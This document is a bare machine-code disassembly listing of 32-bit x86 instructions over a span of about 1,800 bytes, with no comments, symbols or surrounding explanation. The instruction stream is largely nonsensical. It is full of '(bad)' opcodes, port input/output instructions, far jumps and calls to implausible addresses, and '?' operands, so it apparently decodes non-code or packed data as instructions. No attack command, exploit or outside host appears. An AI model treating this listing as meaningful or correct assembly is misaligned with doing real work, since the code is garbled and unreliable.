  43288d:	jne    0x43281a
  43288f:	xor    edi,esp
  432891:	inc    eax
  432892:	dec    ebp
  432893:	jbe    0x4328e8
  432895:	inc    eax
  432896:	pop    ebp
  432897:	add    edx,DWORD PTR [esi+0x8]
  43289a:	push   ecx
  43289b:	dec    eax
  43289c:	push   ecx
  43289d:	mov    eax,edi
  43289f:	and    al,0xf0
  4328a1:	jo     0x43288e
  4328a3:	mov    eax,DWORD PTR [ebx]
  4328a5:	sbb    BYTE PTR [ebp+0x4d],cl
  4328a8:	mov    eax,DWORD PTR [ebx]
  4328aa:	nop
  4328ab:	or     BYTE PTR [eax],al
  4328ad:	jne    0x432906
  4328af:	cmp    ebx,DWORD PTR [ecx+0x33893277]
  4328b5:	cld    
  4328b6:	xor    edi,edi
  4328b8:	add    edi,DWORD PTR [ebp+0x3]
  4328bb:	cmp    DWORD PTR [ecx+0xbcfe8fc],ecx
  4328c1:	js     0x432847
  4328c3:	jae    0x4328c7
  4328c5:	(bad)  
  4328c7:	xor    al,0x5d
  4328c9:	jmp    0x432856
  4328cb:	mov    ecx,DWORD PTR [ecx*4+0x33dfb1de]
  4328d2:	fdecstp 
  4328d4:	test   BYTE PTR [edi],ah
  4328d6:	add    bh,BYTE PTR [ebp+0x0]
  4328d9:	add    ebx,DWORD PTR [ebp-0x77]
  4328dc:	mov    edi,eax
  4328de:	cmp    al,0x0
  4328e1:	adc    dh,BYTE PTR [ebx]
  4328e3:	jge    0x4328e8
  4328e5:	mov    edi,DWORD PTR [ebx]
  4328e7:	jl     0x4328f8
  4328e9:	clc    
  4328ea:	dec    edi
  4328eb:	jge    0x4328ed
  4328ed:	mov    eax,DWORD PTR [ebx]
  4328ef:	jb     0x4328f9
  4328f1:	mov    ecx,DWORD PTR [ebp-0x8]
  4328f4:	mov    edi,edi
  4328f6:	xor    edx,DWORD PTR [eax]
  4328f8:	add    edi,DWORD PTR [ebx]
  4328fa:	mov    DWORD PTR [ebp-0x10],edi
  4328fd:	inc    edi
  4328fe:	pop    ebp
  4328ff:	jge    0x43293c
  432901:	cmp    esi,DWORD PTR [esp+edi*8-0x75]
  432905:	mov    edx,0xc05d87f0
  43290a:	imul   ebx,DWORD PTR [esi+0x14],0xffffffc9
  43290e:	fimul  WORD PTR [eax]
  432910:	fist   WORD PTR [ebp+0x1c]
  432913:	in     al,dx
  432914:	jne    0x432902
  432916:	mov    edi,DWORD PTR [edx-0x7a27a10]
  43291c:	imul   edx,DWORD PTR [ebp+0x14],0xffffffc7
  432920:	fdivp  st(0),st
  432922:	fild   WORD PTR [ebp+0x4510f85c]
  432928:	test   BYTE PTR [ebx+0x4d00fc02],cl
  43292e:	inc    ebp
  43292f:	mov    ecx,DWORD PTR [ebx+0x454dfcfc]
  432935:	mov    ebp,DWORD PTR [ebx-0x4]
  432938:	adc    al,0x8b
  43293a:	rcl    DWORD PTR [eax],0x48
  43293d:	mov    esi,0x7080803
  432942:	fiadd  WORD PTR [ebp+0x4d]
  432945:	mov    WORD PTR [ebx+0x558bfc52],cs
  43294b:	cld    
  43294c:	xor    ebx,DWORD PTR [ebx+0x330103]
  432952:	mov    DWORD PTR [edi+0x872dc],edi
  432958:	xlat   BYTE PTR ds:[ebx]
  432959:	into   
  43295a:	ffreep st(6)
  43295c:	retf   0x6c7
  43295f:	iret   
  432960:	dec    ebp
  432961:	inc    ebp
  432962:	mov    DWORD PTR [ebx],edi
  432964:	fmul   QWORD PTR [edi]
  432966:	dec    ebp
  432967:	jnp    0x43299c
  432969:	add    BYTE PTR [ebx],al
  43296b:	mov    ecx,DWORD PTR [esp+edi*8]
  43296e:	inc    ebp
  43296f:	dec    ebp
  432970:	lea    esi,[ebx]
  432972:	add    DWORD PTR [ebx],eax
  432974:	jb     0x4329b1
  432976:	add    BYTE PTR [edi],cl
  432978:	inc    ebp
  432979:	imul   eax,edi,0x858bd800
  43297f:	cld    
  432980:	clc    
  432981:	mov    DWORD PTR [ebp+0x0],eax
  432984:	inc    DWORD PTR [eax]
  432986:	or     al,0xde
  432988:	sbb    bh,0x1
  43298b:	retf   
  43298c:	add    BYTE PTR [eax+edx*1+0x33004d02],al
  432993:	dec    ebp
  432994:	add    ecx,DWORD PTR [ecx-0x250b2b77]
  43299a:	enter  0x12de,0xdf
  43299e:	inc    ebp
  43299f:	pop    ebp
  4329a0:	dec    DWORD PTR [ebx-0x257f0ff4]
  4329a6:	add    DWORD PTR [edx],edx
  4329a8:	add    BYTE PTR [ebp+0x50],dl
  4329ab:	mov    ecx,DWORD PTR [ecx+0x45d2f4fc]
  4329b1:	xor    esi,DWORD PTR [ecx-0x38c699fd]
  4329b7:	or     ah,al
  4329b9:	pop    ss
  4329ba:	cdq    
  4329bb:	push   ebp
  4329bc:	clc    
  4329bd:	mov    eax,DWORD PTR [ebp-0x4]
  4329c0:	xor    edx,edx
  4329c2:	add    esi,DWORD PTR [ebx]
  4329c4:	cmp    eax,DWORD PTR [ebx]
  4329c6:	hlt    
  4329c7:	cmp    DWORD PTR [ebx],esp
  4329c9:	or     al,BYTE PTR [ebp+0xf]
  4329cc:	mov    eax,DWORD PTR [edx]
  4329ce:	loopne 0x4329d0
  4329d0:	(bad)  
  4329d1:	mov    ecx,esi
  4329d3:	cld    
  4329d4:	pushf  
  4329d5:	pop    ebp
  4329d6:	cdq    
  4329d7:	mov    esi,DWORD PTR [edx]
  4329d9:	lock mov eax,eax
  4329dc:	adc    BYTE PTR [ebx],al
  4329de:	or     BYTE PTR [ebx+0x4d001001],0xcf
  4329e5:	xor    ebp,DWORD PTR [edi+0x50e45189]
  4329eb:	dec    ebp
  4329ec:	mov    ecx,DWORD PTR [ebx-0x31390304]
  4329f2:	(bad)  
  4329f3:	iret   
  4329f4:	inc    ebp
  4329f5:	(bad)  
  4329f6:	jne    0x432a45
  4329f8:	mov    ecx,DWORD PTR [ebx+0x3c603d8]
  4329fe:	(bad)  
  4329ff:	cmp    ebx,eax
  432a01:	je     0x432989
  432a03:	add    edi,edi
  432a05:	or     bh,bh
  432a07:	dec    ebp
  432a08:	inc    ebp
  432a09:	mov    esi,DWORD PTR [ebx]
  432a0b:	cld    
  432a0c:	add    ecx,esi
  432a0e:	cmp    ecx,DWORD PTR [eax-0xc]
  432a11:	mov    edx,DWORD PTR [edi]
  432a13:	or     BYTE PTR [ebp-0x7c],al
  432a16:	mov    ebx,DWORD PTR [ecx-0x7639cd18]
  432a1c:	test   BYTE PTR [ecx+ebx*4],cl
  432a1f:	inc    ebp
  432a20:	xor    bh,BYTE PTR ds:0x8be89c89
  432a26:	out    dx,eax
  432a27:	adc    BYTE PTR [eax],al
  432a29:	jne    0x4329f2
  432a2b:	mov    ebp,esp
  432a2d:	fcomp  DWORD PTR [ebx]
  432a2f:	add    BYTE PTR [ecx],al
  432a31:	inc    DWORD PTR [ebp-0x75]
  432a34:	mov    esp,?
  432a36:	add    al,0xce
  432a38:	mov    ecx,edi
  432a3a:	cld    
  432a3b:	inc    ebp
  432a3c:	fidivr WORD PTR [ebx]
  432a3e:	fbstp  TBYTE PTR [ebp-0x3e]
  432a41:	mov    eax,DWORD PTR [eax]
  432a43:	adc    BYTE PTR [ebx-0x3974038b],cl
  432a49:	fadd   st,st(7)
  432a4b:	add    BYTE PTR [ebp-0x1],al
  432a4e:	mov    ecx,DWORD PTR [esp+edi*8]
  432a51:	inc    ebp
  432a52:	mov    bh,0xc7
  432a55:	loopne 0x432a9c
  432a57:	sbb    ecx,DWORD PTR [ebx+0x4545fc7f]
  432a5d:	add    DWORD PTR [ebx],esi
  432a5f:	pushf  
  432a60:	add    ecx,DWORD PTR [ebx-0x398b03c5]
  432a66:	mov    eax,edi
  432a68:	cwde   
  432a69:	inc    ebp
  432a6a:	inc    ebp
  432a6b:	jne    0x4329f8
  432a6d:	mov    esp,esp
  432a6f:	clc    
  432a70:	add    al,0x4d
  432a72:	mov    DWORD PTR [ebx],esi
  432a74:	or     al,0x33
  432a76:	inc    ebp
  432a77:	lea    ecx,[ebx-0x398d13fd]
  432a7d:	add    bh,al
  432a7f:	inc    ebp
  432a80:	ror    DWORD PTR [ebx+0x45d829],0x8b
  432a87:	add    ebp,esp
  432a89:	shufps xmm1,xmm3,0xc7
  432a8d:	(bad)  
  432a8e:	jmp    0x748865b7
  432a93:	xor    ecx,DWORD PTR [ebx+0x453bec03]
  432a99:	hlt    
  432a9a:	mov    ecx,DWORD PTR [edi]
  432a9c:	fadd   DWORD PTR [ebp+0x0]
  432a9f:	xor    ecx,DWORD PTR [edi]
  432aa1:	add    ecx,ecx
  432aa3:	cmp    edi,edi
  432aa5:	pmuludq mm7,QWORD PTR [edx+0x50]
  432aa9:	(bad)  
  432aaa:	jmp    0x432a37
  432aac:	mov    edi,esp
  432aae:	or     al,0xc6
  432ab0:	inc    ebp
  432ab1:	(bad)  
  432ab2:	mov    eax,DWORD PTR [ebp+0x10]
  432ab5:	jne    0x432a40
  432ab7:	mov    eax,DWORD PTR [ecx]
  432ab9:	clc    
  432aba:	add    BYTE PTR [ebp-0x40],cl
  432abd:	xor    edx,DWORD PTR [eax-0x73]
  432ac0:	jne    0x432ac3
  432ac2:	push   DWORD PTR [edx+0x8]
  432ac5:	add    BYTE PTR [ebp+0x45],al
  432ac8:	mov    ebp,ecx
  432aca:	cld    
  432acb:	add    BYTE PTR [ebp+0x0],cl
  432ace:	xor    eax,DWORD PTR [ebp+0x3]
  432ad1:	mov    ?,WORD PTR [ebx]
  432ad3:	adc    cl,BYTE PTR [ebx+0x110cf8c7]
  432ad9:	sub    eax,0x5d330e4d
  432ade:	lea    esi,[ebx]
  432ae0:	add    DWORD PTR [ebx],eax
  432ae2:	jb     0x432acd
  432ae4:	add    BYTE PTR [eax],al
  432ae6:	inc    ebp
  432ae7:	add    bl,ch
  432ae9:	inc    ebp
  432aea:	mov    esi,DWORD PTR [ebx]
  432aec:	or     al,0x3
  432aee:	(bad)  
  432aef:	mov    edi,eax
  432af1:	in     al,dx
  432af2:	scas   eax,DWORD PTR es:[edi]
  432af3:	inc    ebp
  432af4:	mov    esi,DWORD PTR [ebx]
  432af6:	in     al,0x3
  432af8:	add    al,0x89
  432afa:	mov    ecx,DWORD PTR [eax+edi*8]
  432afd:	dec    ebp
  432afe:	(bad)  
  432aff:	mov    ebx,DWORD PTR [esp+ebx*8-0x30cd3167]
  432b06:	mov    ecx,eax
  432b08:	cld    
  432b09:	push   es
  432b0a:	dec    ebp
  432b0b:	add    al,0x33
  432b0d:	mov    DWORD PTR [ebx],eax
  432b0f:	in     al,dx
  432b10:	cmp    DWORD PTR [ebp-0x67],eax
  432b13:	mov    eax,DWORD PTR [ebp-0xba0068]
  432b19:	mov    edx,DWORD PTR [ebp-0x4]
  432b1c:	mov    ecx,DWORD PTR [ebp-0x2c]
  432b1f:	xor    eax,DWORD PTR [ebp+0x3]
  432b22:	cmp    DWORD PTR [ebx],0x8b327498
  432b28:	xor    edi,esp
  432b2a:	jmp    0xff77287c
  432b2f:	add    ecx,DWORD PTR [ebp-0x3f]
  432b32:	xor    ebx,DWORD PTR [edi]
  432b34:	add    eax,ecx
  432b36:	cmp    ebx,DWORD PTR [eax]
  432b38:	mov    ecx,DWORD PTR [ebp-0x4]
  432b3b:	mov    ecx,DWORD PTR [eax]
  432b3d:	adc    BYTE PTR [ebp-0x80],al
  432b40:	jmp    0x432b43
  432b42:	mov    eax,DWORD PTR [eax]
  432b44:	cld    
  432b45:	mov    bh,0xc6
  432b47:	push   ecx
  432b48:	(bad)  
  432b49:	jne    0x432ba9
  432b4b:	dec    ecx
  432b4d:	or     BYTE PTR [ecx+ebx*1],cl
  432b50:	push   ebp
  432b51:	inc    ebp
  432b52:	in     al,dx
  432b53:	add    ebp,esp
  432b55:	or     bh,al
  432b57:	dec    ebp
  432b58:	cld    
  432b59:	mov    eax,DWORD PTR [ebp+0x4500f8d8]
  432b5f:	cmp    DWORD PTR [ecx],0x2
  432b62:	pushf  
  432b63:	dec    DWORD PTR [ebx+0x45510cf4]
  432b69:	mov    DWORD PTR [ebx+0x5145fc0c],ecx
  432b6f:	mov    edx,DWORD PTR [ecx+0xc]
  432b72:	xor    eax,esi
  432b74:	mov    edx,0xc172c7
  432b79:	inc    ebp
  432b7a:	mov    esi,DWORD PTR [ebp+0x8]
  432b7d:	mov    eax,edx
  432b7f:	call   0x84c7f274
  432b84:	add    DWORD PTR [ecx-0x76bace00],ebx
  432b8a:	mov    ebp,eax
  432b8c:	or     BYTE PTR [eax],dl
  432b8e:	jo     0x432bdd
  432b90:	push   edi
  432b91:	xor    esi,DWORD PTR [ebp+0x3]
  432b94:	(bad)  
  432b95:	pmulhuw mm0,mm1
  432b98:	test   DWORD PTR [ebp-0x8],ecx
  432b9b:	mov    DWORD PTR [ebp-0x67],eax
  432b9e:	mov    eax,DWORD PTR [ebp-0x4]
  432ba1:	xor    edi,DWORD PTR [ebp-0x73]
  432ba4:	xor    eax,DWORD PTR [ebx]
  432ba6:	xor    esi,DWORD PTR [edx+0x3]
  432ba9:	add    BYTE PTR [ecx],bh
  432bab:	inc    ebp
  432bac:	(bad)  
  432bad:	mov    edx,DWORD PTR [ebp-0x7b39fe1c]
  432bb3:	mov    DWORD PTR [eax],0x750f0004
  432bb9:	sub    ecx,DWORD PTR [ebx-0x7974f701]
  432bbf:	lock add BYTE PTR [ebp+0x0],cl
  432bc3:	mov    esi,DWORD PTR [ebp-0x18]
  432bc6:	mov    ebp,edx
  432bc8:	or     al,0x72
  432bca:	ja     0x432bcc
  432bcc:	mov    edx,esi
  432bce:	cld    
  432bcf:	(bad)  
  432bd2:	cli    
  432bd3:	mov    esi,DWORD PTR [ebp-0x4]
  432bd6:	cmp    ecx,esi
  432bd8:	bswap  edi
  432bda:	(bad)
  432bde:	mov    esi,DWORD PTR [ebp-0x4]
  432be1:	mov    esi,ecx
  432be3:	clc    
  432be4:	repnz add esi,DWORD PTR [ebp+0x45]
  432be8:	push   ebx
  432be9:	xor    eax,DWORD PTR [ebp+0x3]
  432bec:	cmp    ebx,DWORD PTR [edi-0x64]
  432bef:	pop    ebx
  432bf0:	jmp    0x432cb7
  432bf5:	mov    esi,DWORD PTR [ebp-0x7d]
  432bf8:	xor    ebp,DWORD PTR [eax]
  432bfa:	lea    eax,[ebp-0x8]
  432bfd:	ss repnz pushf 
  432c00:	out    dx,eax
  432c01:	(bad)  
  432c02:	neg    eax
  432c04:	ins    DWORD PTR es:[edi],dx
  432c05:	test   esi,edi
  432c07:	clc    
  432c08:	pop    esp
  432c09:	inc    ebp
  432c0a:	or     BYTE PTR [ecx+0x450f0c7d],cl
  432c10:	xor    edi,DWORD PTR [ecx+0x70f08e6]
  432c16:	add    cl,al
  432c18:	jne    0x432bb3
  432c1a:	mov    esi,DWORD PTR [edx]
  432c1c:	in     al,dx
  432c1d:	push   esi
  432c1e:	xor    BYTE PTR [ebp-0xe],dh
  432c21:	add    edi,esi
  432c23:	cmp    esi,DWORD PTR [edi+0xc21c10f]
  432c29:	add    cl,bh
  432c2b:	mov    edi,DWORD PTR [ebp+0x8]
  432c2e:	mov    DWORD PTR [ebp-0x14],esi
  432c31:	add    esi,DWORD PTR [ebp+0x3c]
  432c34:	mov    ecx,DWORD PTR [ecx+0x45f10c08]
  432c3a:	mov    ah,0x3d
  432c3c:	cdq    
  432c3d:	pushf  
  432c3e:	xor    cl,BYTE PTR [ebx+0x75e0e489]
  432c44:	jne    0x432bd1
  432c46:	mov    ecx,DWORD PTR [esp+ebp*8]
  432c49:	icebp  
  432c4a:	icebp  
  432c4b:	shl    edx,0xf2
  432c4e:	(bad)  
  432c4f:	mov    ah,0x16
  432c51:	inc    eax
  432c52:	jne    0x432be7
  432c54:	mov    ecx,DWORD PTR [edi]
  432c56:	in     al,dx
  432c57:	jmp    0x432c4a
  432c59:	add    dl,dh
  432c5b:	mov    edi,esi
  432c5d:	or     al,0x8
  432c5f:	inc    ebp
  432c60:	jne    0x432c65
  432c62:	mov    esp,DWORD PTR [eax-0x74c1ff24]
  432c68:	ret    
  432c69:	or     bh,bh
  432c6b:	jge    0x432c55
  432c6d:	sub    ebx,DWORD PTR [edi+0x17d5d34]
  432c73:	xor    edi,eax
  432c75:	add    esi,DWORD PTR [ebp-0x77]
  432c78:	mov    ebx,esp
  432c7a:	clc    
  432c7b:	neg    DWORD PTR [ebp-0x7c]
  432c7e:	xor    eax,DWORD PTR [eax]
  432c80:	cmp    eax,DWORD PTR [eax]
  432c82:	repz jne 0x432c1a
  432c85:	xor    eax,DWORD PTR [ecx]
  432c87:	add    ebx,DWORD PTR [eax]
  432c89:	mov    DWORD PTR [ebp-0x8],eax
  432c8c:	mov    eax,edi
  432c8e:	cld    
  432c8f:	lock pop eax
  432c91:	test   DWORD PTR [ebx],esi
  432c93:	clc    
  432c94:	add    edx,DWORD PTR [edi-0x740bff77]
  432c9a:	fdivp  st(4),st
  432c9c:	test   ecx,esi
  432c9e:	(bad)  
  432c9f:	jnp    0x432ca0
  432ca1:	add    ecx,DWORD PTR [ebx-0x14c4272f]
  432ca7:	jae    0x432c34
  432ca9:	sub    edi,esp
  432cab:	(bad)  
  432cac:	shl    DWORD PTR [eax-0x3e],0x89
  432cb0:	leave  
  432cb1:	call   0x8198e3be
  432cb6:	in     al,dx
  432cb7:	(bad)  
  432cb8:	in     al,dx
  432cb9:	add    bh,al
  432cbb:	mov    esp,edi
  432cbd:	in     al,dx
  432cbe:	test   DWORD PTR [ebp-0x8],edi
  432cc1:	mov    eax,DWORD PTR [ebp+0x2b]
  432cc4:	cmp    DWORD PTR [ebx],eax
  432cc6:	pushf  
  432cc7:	jnp    0x57322900
  432ccd:	xor    edx,DWORD PTR [ecx-0x77]
  432cd0:	push   ecx
  432cd1:	loopne 0x432d06
  432cd3:	jne    0x432c90
  432cd5:	mov    esi,DWORD PTR [edx-0x20]
  432cd8:	add    BYTE PTR [ebp-0x3d],bh
  432cdb:	xor    eax,DWORD PTR [ebp-0x73]
  432cde:	mov    edi,DWORD PTR [esi]
  432ce0:	cld    
  432ce1:	jb     0x432ca9
  432ce3:	add    bl,al
  432ce5:	jne    0x432d2c
  432ce7:	mov    edx,DWORD PTR [edi-0x10]
  432cea:	jge    0x432d69
  432cec:	mov    esi,DWORD PTR [ebx]
  432cee:	lock add ecx,DWORD PTR [ebp+0x3b]
  432cf2:	xor    esi,DWORD PTR [ebp-0x77]
  432cf5:	mov    esi,eax
  432cf7:	lock inc ebp
  432cf9:	jge    0x432d31
  432cfb:	xor    ebx,DWORD PTR [ebx+eax*1+0x75f83b8b]
  432d02:	dec    ebp
  432d03:	mov    esi,DWORD PTR [ebx]
  432d05:	loopne 0x432c90
  432d07:	jge    0x432d01
  432d09:	add    DWORD PTR [ebp-0x7d],eax
  432d0c:	test   BYTE PTR [edx],0x9c
  432d0f:	dec    ebp
  432d10:	mov    esi,DWORD PTR [ebp-0xc]
  432d13:	mov    ecx,DWORD PTR [ebp-0xc]
  432d16:	xor    ebx,DWORD PTR [ebp-0x77]
  432d19:	mov    esi,esp
  432d1b:	in     al,0x45
  432d1d:	jge    0x432d59
  432d1f:	mov    ebx,DWORD PTR [esp+ecx*1-0x43130e75]
  432d26:	dec    ebp
  432d27:	inc    esp
  432d28:	xor    edx,DWORD PTR [ebx+0x3ec7389]
  432d2e:	inc    ebp
  432d2f:	hlt    
  432d30:	ss jne 0x432cd2
  432d33:	mov    edi,DWORD PTR [eax+0xf19504]
  432d39:	repnz mov DWORD PTR [ebp+0x20],ebx
  432d3d:	cmp    eax,DWORD PTR [ebp+0xf]
  432d40:	test   DWORD PTR [edi+ecx*1-0x1],edx
  432d44:	fistp  WORD PTR [ebx+0x0]
  432d47:	inc    ebp
  432d48:	mov    ebx,DWORD PTR [edi+0xc]
  432d4b:	add    eax,eax
  432d4d:	inc    ebp
  432d4e:	test   BYTE PTR [ebx],dh
  432d50:	add    eax,DWORD PTR [ebx]
  432d52:	add    BYTE PTR [esi+0x45],bl
  432d55:	ret    0x85
  432d58:	jnp    0x5443b127
  432d5e:	inc    bp
  432d60:	inc    ebp
  432d61:	ss mov ecx,0xc78a9c
  432d67:	fdiv   QWORD PTR [ebx]
  432d69:	test   DWORD PTR [ecx+0x453af8],edi
  432d6f:	push   ebx
  432d70:	add    edi,DWORD PTR [esi+0x708088b]
  432d76:	cmp    esi,eax
  432d78:	setns  BYTE PTR [ecx-0x74fcffce]
  432d7f:	mov    esp,edi
  432d81:	call   0x33ce72d3
  432d86:	or     BYTE PTR [ebx],al
  432d88:	inc    ecx
  432d89:	mov    DWORD PTR [ecx+0x408b0ce0],ecx
  432d8f:	and    BYTE PTR [ebp-0x7074f0bb],al
  432d95:	lock add cl,al
  432d98:	mov    DWORD PTR [ebp-0x2c],0xf8f08581
  432d9f:	mov    ch,0x45
  432da1:	clc    
  432da2:	xor    eax,DWORD PTR [ebp+0x3]
  432da5:	mov    ecx,DWORD PTR [ecx+0x45c1d4f8]
  432dab:	inc    ebp
  432dac:	mov    eax,DWORD PTR [ecx-0x7aff0770]
  432db2:	mov    edi,eax
  432db4:	mov    eax,DWORD PTR [ebp+0x3c]
  432db7:	mov    ecx,DWORD PTR [eax]
  432db9:	hlt    
  432dba:	inc    ebp
  432dbb:	ror    DWORD PTR [ebx+0x818c45],0xf4
  432dc2:	mov    eax,DWORD PTR [ebp+0x45e4f889]
  432dc8:	push   ebp
  432dc9:	mov    edi,DWORD PTR [ebx]
  432dcb:	in     al,dx
  432dcc:	jne    0x432d8f
  432dce:	mov    eax,DWORD PTR [ebp-0x28]
  432dd1:	add    DWORD PTR [eax],0xe8058dec
  432dd7:	clc    
  432dd8:	mov    esi,DWORD PTR [edi-0x8]
  432ddb:	add    dh,dl
  432ddd:	rol    WORD PTR [ebp-0x1],cl
  432de1:	mov    edx,DWORD PTR [eax+0x8]
  432de4:	jne    0x432da6
  432de6:	inc    DWORD PTR [esp+ebx*1-0x74ffb2fd]
  432ded:	inc    ebp
  432dee:	push   esp
  432def:	test   DWORD PTR [ecx+0xf],ecx
  432df2:	sub    edx,esp
  432df4:	add    eax,DWORD PTR [eax]
  432df6:	and    BYTE PTR [ebx-0x3fc4e7b0],cl
  432dfc:	add    BYTE PTR [ebx+ecx*4-0x78ffdffd],al
  432e03:	mov    eax,DWORD PTR [ecx]
  432e05:	and    BYTE PTR [eax],al
  432e07:	cmp    BYTE PTR [eax],dl
  432e09:	add    BYTE PTR [ebp+0x66],al
  432e0c:	inc    ecx
  432e0e:	push   esp
  432e0f:	(bad)  
  432e10:	jne    0x432e12
  432e12:	push   edx
  432e13:	enterw 0xc1,0x4d
  432e18:	mov    esp,DWORD PTR [esi+0x20]
  432e1b:	add    DWORD PTR [ecx-0x7b],eax
  432e1e:	add    eax,DWORD PTR [ebx]
  432e20:	str    WORD PTR [eax+0x45]
  432e24:	lea    ecx,[ebx+0x45890801]
  432e2a:	sbb    BYTE PTR [ebx],al
  432e2c:	dec    ebp
  432e2d:	cmp    al,0xf
  432e2f:	inc    ebp
  432e30:	push   eax
  432e31:	mov    esi,DWORD PTR [ebx]
  432e33:	push   eax
  432e34:	add    eax,eax
  432e36:	mov    DWORD PTR [esp+ecx*1-0x7bff2efd],eax
  432e3d:	inc    ebp
  432e3e:	add    BYTE PTR [esi],dh
  432e40:	add    BYTE PTR [ebp+ecx*2+0x3d4338b],cl
  432e47:	(bad)  
  432e48:	mov    ebx,eax
  432e4a:	loopne 0x432e91
  432e4c:	dec    ebp
  432e4d:	mov    ecx,DWORD PTR [edi]
  432e4f:	cld    
  432e50:	push   eax
  432e51:	xchg   DWORD PTR [ebx],esi
  432e53:	add    DWORD PTR [ebx],ebp
  432e55:	add    BYTE PTR [ebx],ch
  432e57:	or     BYTE PTR [ecx],bh
  432e59:	dec    ecx
  432e5a:	loopne 0x432e5f
  432e5c:	xchg   DWORD PTR [ebx-0x78ff0400],ecx
  432e62:	push   ebp
  432e63:	add    DWORD PTR [ebx+0x55100800],eax
  432e69:	dec    ebp
  432e6a:	jmp    0x432df5
  432e6c:	mov    esp,DWORD PTR [eax]
  432e6e:	sbb    dl,dl
  432e70:	inc    eax
  432e71:	xor    ecx,DWORD PTR [ebp+0x4501ff87]
  432e77:	add    BYTE PTR [ebx+0x74528555],cl
  432e7d:	push   ebp
  432e7e:	div    DWORD PTR [ebx]
  432e80:	and    eax,DWORD PTR [ebx]
  432e82:	add    edx,DWORD PTR [edx-0x30]
  432e85:	jno    0x432e12
  432e87:	inc    DWORD PTR [eax+eiz*1]
  432e8a:	inc    ebp
  432e8b:	push   eax
  432e8c:	push   eax
  432e8d:	mov    esp,DWORD PTR [edi-0x74beff1c]
  432e93:	mov    edi,esp
  432e95:	push   eax
  432e96:	inc    ebp
  432e97:	enter  0x458b,0x8
  432e9b:	push   ecx
  432e9c:	(bad)  
  432e9d:	call   0x10d3875
  432ea2:	pop    ss
  432ea3:	push   ebp
  432ea4:	mov    ecx,DWORD PTR [ebx+0x489408]
  432eaa:	mov    ecx,DWORD PTR [ecx+0xc458b04]
  432eb0:	push   ecx
  432eb1:	jo     0x432e9b
  432eb3:	inc    DWORD PTR [edi]
  432eb5:	or     BYTE PTR [eax],al
  432eb7:	call   0xce3601
  432ebc:	fmul   QWORD PTR [ebp+0x55]
  432ebf:	mov    eax,DWORD PTR [ebx-0x313ed7c4]
  432ec5:	mov    bh,0x8c
  432ec7:	adc    al,0x99
  432ec9:	dec    esp
  432eca:	xor    bl,BYTE PTR [eax]
  432ecc:	mov    ecx,DWORD PTR [ebp+0xc]
  432ecf:	mov    eax,DWORD PTR [ebp-0x4]
  432ed2:	mov    esi,DWORD PTR [edi-0x3148f924]
  432ed8:	push   es
  432ed9:	retf   
  432eda:	mov    BYTE PTR [ebp-0x30],0x3b
  432ede:	inc    ebp
  432edf:	movntps XMMWORD PTR [eax-0x741fff77],xmm5
  432ee6:	retf   0x83fc
  432ee9:	into   
  432eea:	dec    ebp
  432eeb:	retf   
  432eec:	mov    ecx,DWORD PTR [ebp-0x74]
  432eef:	mov    eax,DWORD PTR [eax]
  432ef1:	fdiv   QWORD PTR [ebx]
  432ef3:	mov    bh,0x3
  432ef5:	push   es
  432ef6:	mov    esi,ecx
  432ef8:	sbb    cl,dl
  432efa:	dec    ebp
  432efb:	sar    DWORD PTR [ebx],cl
  432efd:	push   ebp
  432efe:	jne    0x432f0f
  432f00:	mov    ecx,DWORD PTR [eax-0x74ffff28]
  432f06:	lea    ebx,[eax]
  432f08:	call   0xf4ccbacf
  432f0d:	sbb    dh,dl
  432f0f:	add    edx,ebx
  432f11:	push   ebp
  432f12:	mov    ecx,DWORD PTR [ebx+0x487238e4]
  432f18:	push   ecx
  432f19:	mov    DWORD PTR [eax-0x30],edx
  432f1c:	test   DWORD PTR [edx],eax
  432f1e:	xadd   esp,esi
  432f21:	pop    es
  432f22:	add    cl,dl
  432f24:	mov    eax,ecx
  432f26:	or     al,0x45
  432f28:	(bad)  
  432f29:	push   eax
  432f2a:	add    DWORD PTR [edx+0x0],eax
  432f2d:	add    ecx,DWORD PTR [ecx]
  432f2f:	and    dh,cl
  432f31:	call   0xc73801
  432f36:	add    DWORD PTR [ebp+0x0],edx
  432f39:	mov    esp,DWORD PTR [ebp+0x18]
  432f3c:	add    BYTE PTR [eax+0x48],cl
  432f3f:	xor    eax,DWORD PTR [eax]
  432f41:	add    esp,DWORD PTR [esi+0x3b]
  432f44:	inc    ebp
  432f45:	je     0x432eca
  432f47:	push   ecx
  432f48:	push   es
  432f49:	dec    ebp
  432f4a:	mov    DWORD PTR [ebx],eax
  432f4c:	(bad)  
  432f4d:	or     al,0x5e
  432f4f:	inc    eax
  432f50:	add    BYTE PTR [ebx],al
  432f52:	data16 and BYTE PTR [ebp+0x50],al
  432f56:	sub    DWORD PTR [ecx],0xfffffff8
  432f59:	add    BYTE PTR [ebp-0x75],ah
  432f5c:	add    BYTE PTR [eax],bl
  432f5e:	enter  0x894d,0x8b
  432f62:	int3   
  432f63:	loopne 0x432f9f
  432f65:	rol    BYTE PTR [eax],0x33
  432f68:	lea    cx,[ebp+0xa]
  432f6c:	data16 jb 0x432fb4
  432f6f:	add    BYTE PTR [ebx+0x44890855],cl
  432f75:	sbb    ah,al
  432f77:	inc    ebp
  432f78:	cmp    BYTE PTR [edi],cl
  432f7a:	add    BYTE PTR [edx+0x66],dl
  432f7d:	xor    ecx,DWORD PTR [eax]
  432f7f:	sub    edi,esi
  432f81:	mov    eax,DWORD PTR [eax]
  432f83:	or     al,0x66
  432f85:	ror    edx,cl
  432f87:	dec    ebp
  432f88:	inc    ebp
  432f89:	cmp    eax,DWORD PTR [ebx+0x668b0876]
  432f8f:	cld    
  432f90:	or     BYTE PTR [edi+0x4501dd],dl
  432f96:	ret    0xe8ce
  432f99:	retf   
  432f9a:	(bad)  
  432f9b:	dec    ebp
  432f9c:	mov    al,0x8b
  432f9e:	in     al,dx
  432f9f:	and    BYTE PTR [ebx],bh
  432fa1:	or     al,BYTE PTR [ebp+0x27]
  432fa4:	in     al,dx
  432fa5:	xchg   eax,ebp
  432fa7:	add    edi,eax
  432fa9:	add    BYTE PTR [eax+0x3f52ed55],bh
  432faf:	push   ebp
  432fb0:	inc    ebp
  432fb1:	xor    ebx,edx
  432fb3:	add    ebp,eax
  432fb5:	push   edx
  432fb6:	push   bp
  432fb8:	inc    ebp
  432fb9:	(bad)  
  432fba:	jmp    0xc342f613
  432fbf:	sbb    al,0x33
  432fc1:	ror    BYTE PTR [ebp-0x75fef27c],0x0
  432fc8:	add    BYTE PTR [ebp+0x44],0x8b
  432fcc:	jmp    0xf98b:0x100041c8
  432fd3:	xor    esi,DWORD PTR [edx+0x3]
  432fd6:	mov    ecx,DWORD PTR [edi]
